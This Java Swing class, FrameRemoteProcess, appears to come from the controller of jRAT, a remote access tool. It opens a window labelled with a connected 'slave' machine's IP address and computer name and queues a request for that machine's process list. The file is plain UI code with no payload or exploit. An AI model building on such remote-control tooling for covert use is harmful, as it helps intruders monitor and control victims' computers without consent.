package se.jrat.controller.ui.frames;

import java.awt.Toolkit;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.HashMap;
import java.util.Map;

import javax.swing.JFrame;

import se.jrat.controller.Slave;
import se.jrat.controller.packets.outgoing.Packet19ListProcesses;
import se.jrat.controller.ui.panels.PanelControlRemoteProcess;


@SuppressWarnings("serial")
public class FrameRemoteProcess extends BaseFrame {

	public static final Map<Slave, FrameRemoteProcess> instances = new HashMap<Slave, FrameRemoteProcess>();

	private Slave slave;
	private PanelControlRemoteProcess panel;

	public FrameRemoteProcess(Slave sl) {
		setTitle("Remote Process - " + sl.getIP() + " - " + sl.getComputerName());
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRemoteProcess.class.getResource("/icons/process.png")));
		setResizable(false);
		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent e) {
				exit();
			}
		});
		this.slave = sl;
		instances.put(sl, this);
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 535, 326);
		
		panel = new PanelControlRemoteProcess(sl);
		
		add(panel);
	}

	public void list() {
		slave.addToSendQueue(new Packet19ListProcesses());
	}
	
	public void exit() {
		instances.remove(slave);
	}
	
	public PanelControlRemoteProcess getPanel() {
		return panel;
	}
}
